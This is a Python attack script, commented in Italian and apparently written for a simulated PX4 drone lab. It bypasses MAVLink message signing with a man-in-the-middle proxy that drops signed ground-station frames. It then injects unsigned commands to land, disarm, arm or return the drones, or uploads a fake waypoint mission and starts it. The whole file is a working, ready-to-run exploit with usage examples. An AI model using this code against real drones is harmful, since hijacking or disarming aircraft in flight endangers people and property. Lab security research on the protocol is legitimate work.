#!/usr/bin/env python3
"""
threat_c_signing_bypass.py  (v2 — proxy bidirezionale)
=======================================================
Threat C — MAVLink Signing Bypass via Channel Initialization Starvation
Caso: chiave NON condivisa tra droni (per-drone keys)

Fix rispetto a v1:
  - Proxy ora BIDIREZIONALE: forwarda sia MAVProxy→Drone che Drone→MAVProxy
    (risolve "link 2 down / link 3 down" in MAVProxy)
  - COMMAND_LONG corretto: target_system ora scritto nel campo giusto
    (risolve "Ignore command 20 from 255/190 to 0/2")
  - Drop signed applicato solo nella direzione GCS→Drone

Topologia:
  PX4 SITL WSL2 @ 172.25.12.121
    Drone 1 (sysid=1) porta 18570  [nostro, connessione diretta]
    Drone 2 (sysid=2) porta 18571  [target, passa per proxy :18581]
    Drone 3 (sysid=3) porta 18572  [target, passa per proxy :18582]

PERCHE FUNZIONA:
  MAVLink signing e stateful per-canale:
    STATO A: nessun signed ricevuto → accetta tutto (anche unsigned)
    STATO B: ricevuto almeno un signed valido → accetta solo signed validi
  Il proxy droppa tutti i signed GCS→Drone → i target restano in STATO A.
  I nostri COMMAND_LONG unsigned vengono accettati senza chiave.
  Spec: mavlink.io/en/guide/message_signing.html
"""

import socket
import struct
import threading
import time
import argparse
import sys
from typing import List

# ═══════════════════════════════════════════════════════════════════
#  TOPOLOGIA
# ═══════════════════════════════════════════════════════════════════

DRONE_IP = "172.25.12.121"

FLEET = {
    1: {"sysid": 1, "compid": 1, "port": 18570},
    2: {"sysid": 2, "compid": 1, "port": 18571},
    3: {"sysid": 3, "compid": 1, "port": 18572},
}

MITM_LISTEN_PORTS = {
    2: 18581,
    3: 18582,
}

GCS_SYSID  = 255
GCS_COMPID = 190
OUR_SYSID  = 1
OUR_COMPID = 1

# ═══════════════════════════════════════════════════════════════════
#  MAVLink parser minimale
# ═══════════════════════════════════════════════════════════════════

MAV_V2_STX = 0xFD
MAV_V1_STX = 0xFE

def parse_frame(data: bytes):
    if not data:
        return None, 0
    stx = data[0]
    if stx == MAV_V2_STX:
        if len(data) < 12:
            return None, 0
        plen     = data[1]
        incompat = data[2]
        sysid    = data[5]
        compid   = data[6]
        msgid    = struct.unpack_from("<I", data[7:10] + b'\x00')[0]
        signed   = bool(incompat & 0x01)
        sig_len  = 13 if signed else 0
        total    = 10 + plen + 2 + sig_len
        if len(data) < total:
            return None, 0
        return {"version": 2, "sysid": sysid, "compid": compid,
                "msgid": msgid, "signed": signed, "raw": data[:total]}, total
    elif stx == MAV_V1_STX:
        if len(data) < 8:
            return None, 0
        plen  = data[1]
        sysid = data[3]
        compid= data[4]
        msgid = data[5]
        total = 6 + plen + 2
        if len(data) < total:
            return None, 0
        return {"version": 1, "sysid": sysid, "compid": compid,
                "msgid": msgid, "signed": False, "raw": data[:total]}, total
    return None, 0

# ═══════════════════════════════════════════════════════════════════
#  Builder pacchetti unsigned
# ═══════════════════════════════════════════════════════════════════

_seq = 0
def _next_seq():
    global _seq
    _seq = (_seq + 1) & 0xFF
    return _seq

CRC_EXTRA = {0: 50, 11: 89, 76: 152, 109: 185}

def _crc(data: bytes, extra: int) -> int:
    crc = 0xFFFF
    for b in data:
        tmp = b ^ (crc & 0xFF)
        tmp = (tmp ^ (tmp << 4)) & 0xFF
        crc = ((crc >> 8) ^ (tmp << 8) ^ (tmp << 3) ^ (tmp >> 4)) & 0xFFFF
    tmp = extra ^ (crc & 0xFF)
    tmp = (tmp ^ (tmp << 4)) & 0xFF
    crc = ((crc >> 8) ^ (tmp << 8) ^ (tmp << 3) ^ (tmp >> 4)) & 0xFFFF
    return crc

def build_unsigned_v2(msg_id: int, payload: bytes,
                      src_sysid: int, src_compid: int) -> bytes:
    plen   = len(payload)
    mid3   = struct.pack("<I", msg_id)[:3]
    header = bytes([MAV_V2_STX, plen, 0x00, 0x00,
                    _next_seq(), src_sysid, src_compid]) + mid3
    crc_val = _crc(header[1:] + payload, CRC_EXTRA.get(msg_id, 0))
    return header + payload + struct.pack("<H", crc_val)

def pkt_command_long(target_sysid: int, target_compid: int, cmd: int,
                     p1=0., p2=0., p3=0., p4=0., p5=0., p6=0., p7=0.,
                     src_sysid: int = GCS_SYSID,
                     src_compid: int = GCS_COMPID) -> bytes:
    """
    COMMAND_LONG (msgid=76).
    Wire layout verificato da pymavlink byte-per-byte:
      [0-27]  float32 x7  param1..7
      [28-29] uint16      command
      [30]    uint8       target_system    ← sysid del drone
      [31]    uint8       target_component
      [32]    uint8       confirmation
    Totale: 33 bytes

    NOTA: l'ordine wire NON e' lo stesso dell'ordine logico dei campi.
    target_system e target_component vengono PRIMA di confirmation sul wire.
    """
    payload = struct.pack("<fffffffHBBB",
                          p1, p2, p3, p4, p5, p6, p7,
                          cmd,
                          target_sysid,   # [30] target_system
                          target_compid,  # [31] target_component
                          0)              # [32] confirmation
    return build_unsigned_v2(76, payload, src_sysid, src_compid)

MAV_CMD_NAV_RTL              = 20
MAV_CMD_NAV_LAND             = 21
MAV_CMD_NAV_WAYPOINT         = 16
MAV_CMD_DO_SET_MODE          = 176
MAV_CMD_COMPONENT_ARM_DISARM = 400
MAV_CMD_MISSION_START        = 300
PX4_MODE_HOLD                = 4

# CRC_EXTRA aggiuntivi per messaggi missione (verificati da pymavlink)
CRC_EXTRA.update({44: 191, 73: 38, 45: 104})

# Coordinate home PX4 SITL default (Zurigo)
HOME_LAT = 47.397742
HOME_LON = 8.545594


def build_mission_clear_all(target_sysid: int, target_compid: int,
                             src_sysid: int = GCS_SYSID,
                             src_compid: int = GCS_COMPID) -> bytes:
    """MISSION_CLEAR_ALL (msgid=45) — wire: target_system, target_component, mission_type"""
    payload = struct.pack("<BBB", target_sysid, target_compid, 0)
    return build_unsigned_v2(45, payload, src_sysid, src_compid)


def build_mission_count(target_sysid: int, target_compid: int,
                        count: int,
                        src_sysid: int = GCS_SYSID,
                        src_compid: int = GCS_COMPID) -> bytes:
    """MISSION_COUNT (msgid=44) — wire: count(uint16), target_system, target_component, mission_type"""
    payload = struct.pack("<HBBB", count, target_sysid, target_compid, 0)
    return build_unsigned_v2(44, payload, src_sysid, src_compid)


def build_mission_item_int(target_sysid: int, target_compid: int,
                            seq: int, lat_degE7: int, lon_degE7: int,
                            alt: float, current: int,
                            src_sysid: int = GCS_SYSID,
                            src_compid: int = GCS_COMPID) -> bytes:
    """
    MISSION_ITEM_INT (msgid=73).
    Wire layout verificato da pymavlink:
      float32 param1..4, int32 x(lat), int32 y(lon), float32 z(alt),
      uint16 seq, uint16 command,
      uint8 target_system, uint8 target_component,
      uint8 frame, uint8 current, uint8 autocontinue, uint8 mission_type
    """
    payload = struct.pack("<ffffiiifHHBBBBBB",
                          0.0, 0.0, 0.0, float('nan'),
                          lat_degE7, lon_degE7,
                          0,           # placeholder per float z
                          alt,
                          seq,
                          MAV_CMD_NAV_WAYPOINT,
                          target_sysid,
                          target_compid,
                          3,           # MAV_FRAME_GLOBAL_RELATIVE_ALT
                          current,
                          1,           # autocontinue
                          0)           # mission_type
    return build_unsigned_v2(73, payload, src_sysid, src_compid)


def mission_deception(target_sysid: int, radius_deg: float = 0.0015,
                      alt: float = 25.0, n_waypoints: int = 6):
    """
    Mission Deception — copia esatta del pattern inject_drones_v2.py Attack F
    che funziona gia'. MAVLink v1 (unsigned per spec), nessuna chiave.
    """
    import math
    try:
        from pymavlink import mavutil
    except ImportError:
        print("[!] pymavlink richiesto")
        return

    drone  = FLEET[target_sysid]
    compid = drone["compid"]

    waypoints = [(HOME_LAT, HOME_LON, 0.0)]
    for i in range(n_waypoints):
        angle = i * (2 * math.pi / n_waypoints)
        waypoints.append((
            HOME_LAT + radius_deg * math.cos(angle),
            HOME_LON + radius_deg * math.sin(angle),
            alt
        ))

    print(f"\n{'═'*60}")
    print(f"[MISSION] Threat D — Mission Deception → sysid={target_sysid}")
    print(f"[MISSION] {len(waypoints)} waypoint, ~{radius_deg*111000:.0f}m raggio, alt={alt}m")
    print(f"[MISSION] MAVLink v1 unsigned — nessuna chiave")
    print(f"{'═'*60}")

    # Pattern identico a inject_drones_v2.py connect()
    conn = mavutil.mavlink_connection(
        f"udpout:{DRONE_IP}:{drone['port']}",
        source_system=GCS_SYSID,
        source_component=GCS_COMPID,
    )
    time.sleep(0.3)

    def send_command(cmd, p1=0, p2=0, p3=0, p4=0, p5=0, p6=0, p7=0, confirmations=3):
        for confirm in range(confirmations):
            conn.mav.command_long_send(
                target_sysid, compid, cmd, confirm,
                p1, p2, p3, p4, p5, p6, p7)
            time.sleep(0.1)

    # Step 1: MISSION_CLEAR_ALL
    print(f"[MISSION] Step 1: MISSION_CLEAR_ALL...")
    conn.mav.mission_clear_all_send(target_sysid, compid)
    time.sleep(0.5)

    # Step 2: MISSION_COUNT
    print(f"[MISSION] Step 2: MISSION_COUNT = {len(waypoints)}")
    conn.mav.mission_count_send(target_sysid, compid, len(waypoints))

    # Step 3: Handshake
    print(f"[MISSION] Step 3: Handshake waypoint...")
    sent     = set()
    ok       = False
    deadline = time.time() + 12.0

    while time.time() < deadline:
        try:
            msg = conn.recv_match(
                type=['MISSION_REQUEST_INT', 'MISSION_ACK'],
                blocking=True, timeout=2.0)
        except Exception:
            msg = None
        if not msg:
            continue

        if msg.get_type() == 'MISSION_REQUEST_INT':
            wp = msg.seq
            if wp < len(waypoints) and wp not in sent:
                la, lo, al = waypoints[wp]
                conn.mav.mission_item_int_send(
                    target_sysid, compid,
                    wp, 3, MAV_CMD_NAV_WAYPOINT,
                    1 if wp == 1 else 0, 1,
                    0., 0., 0., float('nan'),
                    int(la * 1e7), int(lo * 1e7), al, 0)
                sent.add(wp)
                print(f"  WP[{wp}] inviato")
        elif msg.get_type() == 'MISSION_ACK':
            ok = msg.type == 0
            print(f"  MISSION_ACK: {'ACCEPTED ✓' if ok else 'ERROR '+str(msg.type)}")
            break

    if not ok:
        print(f"[MISSION] Upload fallito.")
        return

    # Step 4: ARM
    print(f"[MISSION] Step 4: ARM...")
    send_command(MAV_CMD_COMPONENT_ARM_DISARM, p1=1.0)
    time.sleep(1.0)

    # Step 5: MISSION_START
    print(f"[MISSION] Step 5: MISSION_START...")
    send_command(MAV_CMD_MISSION_START, p1=0.0, p2=float(len(waypoints) - 1))

    print(f"[MISSION] ✓ Mission Deception OK → sysid={target_sysid}")
    print(f"[MISSION] Guarda Gazebo!")

# ═══════════════════════════════════════════════════════════════════
#  Proxy BIDIREZIONALE
# ═══════════════════════════════════════════════════════════════════

class BidirectionalProxy:
    """
    Proxy bidirezionale tra MAVProxy e un drone target.

    Usa un singolo socket UDP bindato su listen_port.

    Logica direzione:
      - Pacchetto da 127.0.0.1 (o IP locale)  → viene da MAVProxy → filtra signed → forwarda al drone
      - Pacchetto da DRONE_IP                  → viene dal drone → forwarda sempre a MAVProxy
    """

    def __init__(self, target_sysid: int):
        self.target_sysid  = target_sysid
        self.drone         = FLEET[target_sysid]
        self.listen_port   = MITM_LISTEN_PORTS[target_sysid]
        self.drone_addr    = (DRONE_IP, self.drone["port"])
        self.running       = True
        self.mavproxy_addr = None
        self.lock          = threading.Lock()
        self.stats         = {"fwd_to_drone": 0, "dropped_signed": 0,
                              "fwd_to_gcs": 0, "injected": 0}

        self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.sock.bind(("0.0.0.0", self.listen_port))
        self.sock.settimeout(0.3)

        print(f"[PROXY-{target_sysid}] In ascolto su :{self.listen_port} "
              f"→ drone @ {self.drone_addr}")

    def run(self):
        print(f"[PROXY-{self.target_sysid}] Avviato")
        while self.running:
            try:
                data, addr = self.sock.recvfrom(4096)
            except socket.timeout:
                continue
            except Exception:
                break

            from_drone = (addr[0] == DRONE_IP)

            if from_drone:
                # Drone → MAVProxy: forwarda sempre, senza filtraggio
                with self.lock:
                    mav_addr = self.mavproxy_addr
                if mav_addr:
                    try:
                        self.sock.sendto(data, mav_addr)
                        self.stats["fwd_to_gcs"] += 1
                    except Exception:
                        pass
            else:
                # MAVProxy → Drone: impara addr MAVProxy, filtra signed
                with self.lock:
                    if self.mavproxy_addr != addr:
                        self.mavproxy_addr = addr
                        print(f"[PROXY-{self.target_sysid}] "
                              f"MAVProxy addr: {addr}")

                offset = 0
                while offset < len(data):
                    fi, consumed = parse_frame(data[offset:])
                    if fi is None or consumed == 0:
                        break
                    if fi["signed"]:
                        self.stats["dropped_signed"] += 1
                        print(f"[PROXY-{self.target_sysid}] "
                              f"DROP signed sysid={fi['sysid']} "
                              f"msgid={fi['msgid']} "
                              f"(tot: {self.stats['dropped_signed']})")
                    else:
                        try:
                            self.sock.sendto(fi["raw"], self.drone_addr)
                            self.stats["fwd_to_drone"] += 1
                        except Exception:
                            pass
                    offset += consumed

    def inject(self, attack: str):
        _inject_to_drone(self.target_sysid, attack, self.sock)
        self.stats["injected"] += 1

    def stop(self):
        self.running = False
        try:
            self.sock.close()
        except Exception:
            pass
        print(f"[PROXY-{self.target_sysid}] Fermato. Stats: {self.stats}")

# ═══════════════════════════════════════════════════════════════════
#  Injection
# ═══════════════════════════════════════════════════════════════════

def _inject_to_drone(target_sysid: int, attack: str, sock: socket.socket):
    drone  = FLEET[target_sysid]
    addr   = (DRONE_IP, drone["port"])
    compid = drone["compid"]

    # MISSION viene gestita separatamente (richiede handshake)
    if attack == "MISSION":
        mission_deception(target_sysid)
        return

    ATTACKS = {
        "RTL":    (MAV_CMD_NAV_RTL,              {}),
        "LAND":   (MAV_CMD_NAV_LAND,             {}),
        "ARM":    (MAV_CMD_COMPONENT_ARM_DISARM, {"p1": 1.0}),
        "DISARM": (MAV_CMD_COMPONENT_ARM_DISARM, {"p1": 0.0}),
        "HOLD":   (MAV_CMD_DO_SET_MODE,          {"p1": 1.0,
                                                  "p2": float(PX4_MODE_HOLD)}),
    }

    if attack not in ATTACKS:
        print(f"[!] Attack sconosciuto: {attack}")
        return

    cmd, kwargs = ATTACKS[attack]

    print(f"\n{'─'*60}")
    print(f"[INJECT] sysid={target_sysid} attack={attack} cmd={cmd}")
    print(f"[INJECT] → {addr}  unsigned, GCS sysid={GCS_SYSID}")
    print(f"[INJECT] target_system={target_sysid} nel pacchetto")
    print(f"{'─'*60}")

    for _ in range(5):
        pkt = pkt_command_long(
            target_sysid, compid, cmd,
            src_sysid=GCS_SYSID, src_compid=GCS_COMPID,
            **kwargs
        )
        sock.sendto(pkt, addr)
        time.sleep(0.06)

    print(f"[INJECT] OK {attack} x5 → sysid={target_sysid}")


def direct_inject(targets: List[int], attack: str):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    print(f"\n{'═'*60}")
    print(f"  Threat C — Unsigned Injection Diretta")
    print(f"  Targets: {targets}  Attack: {attack}")
    print(f"  target_system nel pacchetto = sysid drone (fix v2)")
    print(f"{'═'*60}")
    for sysid in targets:
        if sysid not in FLEET:
            print(f"[!] sysid={sysid} non in FLEET")
            continue
        _inject_to_drone(sysid, attack, sock)
        time.sleep(0.3)
    sock.close()
    print(f"\n[+] Injection completata.")

# ═══════════════════════════════════════════════════════════════════
#  MAIN
# ═══════════════════════════════════════════════════════════════════

def main():
    parser = argparse.ArgumentParser(
        description="Threat C — MAVLink Signing Bypass v2",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Esempi:

  # Terminale 4: proxy
  python3 threat_c_signing_bypass.py --mode proxy --target 2 3

  # Terminale 5: MAVProxy
  mavproxy.py \\
    --master=udpout:172.25.12.121:18570 \\
    --master=udpout:127.0.0.1:18581 \\
    --master=udpout:127.0.0.1:18582 \\
    --out=udp:172.25.0.1:14550 \\
    --source-system=254 --mav20 --load-module=hijack

  # Terminale 6: attacco
  python3 threat_c_signing_bypass.py --mode inject --target 2 3 --attack RTL
  python3 threat_c_signing_bypass.py --mode inject --target 2 3 --attack LAND
  python3 threat_c_signing_bypass.py --mode inject --target 2 3 --attack DISARM
  python3 threat_c_signing_bypass.py --mode inject --target 2 --attack MISSION

  # Demo automatica
  python3 threat_c_signing_bypass.py --mode demo --target 2 3 --attack RTL --delay 30
  python3 threat_c_signing_bypass.py --mode demo --target 2 --attack MISSION --delay 20
        """
    )
    parser.add_argument("--mode", choices=["proxy", "inject", "demo"],
                        default="demo")
    parser.add_argument("--target", type=int, nargs="+", default=[2, 3])
    parser.add_argument("--attack",
                        choices=["RTL", "LAND", "ARM", "DISARM", "HOLD", "MISSION"],
                        default="RTL")
    parser.add_argument("--delay", type=float, default=20.0)
    args = parser.parse_args()

    print(f"\n{'═'*60}")
    print(f"  Threat C — MAVLink Signing Bypass  (v2)")
    print(f"  Targets: sysid={args.target}  Mode: {args.mode}")
    print(f"{'═'*60}\n")

    if args.mode == "inject":
        direct_inject(args.target, args.attack)
        return

    proxies = []
    for sysid in args.target:
        if sysid not in MITM_LISTEN_PORTS:
            print(f"[!] Nessuna porta MITM per sysid={sysid}")
            continue
        p = BidirectionalProxy(sysid)
        threading.Thread(target=p.run, daemon=True).start()
        proxies.append(p)

    if not proxies:
        return

    if args.mode == "proxy":
        print("[PROXY] Proxy bidirezionali attivi. Ctrl+C per fermare.\n")
        try:
            while True:
                time.sleep(5)
                for p in proxies:
                    print(f"  sysid={p.target_sysid} | "
                          f"→drone={p.stats['fwd_to_drone']} | "
                          f"dropped={p.stats['dropped_signed']} | "
                          f"→gcs={p.stats['fwd_to_gcs']}")
        except KeyboardInterrupt:
            pass

    elif args.mode == "demo":
        print(f"[DEMO] Proxy attivi. Injection {args.attack} tra {args.delay}s\n")
        try:
            elapsed = 0
            step    = 5
            while elapsed < args.delay:
                time.sleep(step)
                elapsed += step
                remaining = args.delay - elapsed
                for p in proxies:
                    print(f"  sysid={p.target_sysid} | "
                          f"→drone={p.stats['fwd_to_drone']} | "
                          f"dropped={p.stats['dropped_signed']} | "
                          f"→gcs={p.stats['fwd_to_gcs']}")
                if remaining > 0:
                    print(f"  [DEMO] Injection tra ~{remaining:.0f}s...")
            print(f"\n[DEMO] *** INJECTION ***")
            for p in proxies:
                p.inject(args.attack)
            print(f"\n[DEMO] Injection completata. Ctrl+C per fermare.")
            while True:
                time.sleep(5)
        except KeyboardInterrupt:
            pass

    for p in proxies:
        p.stop()


if __name__ == "__main__":
    main()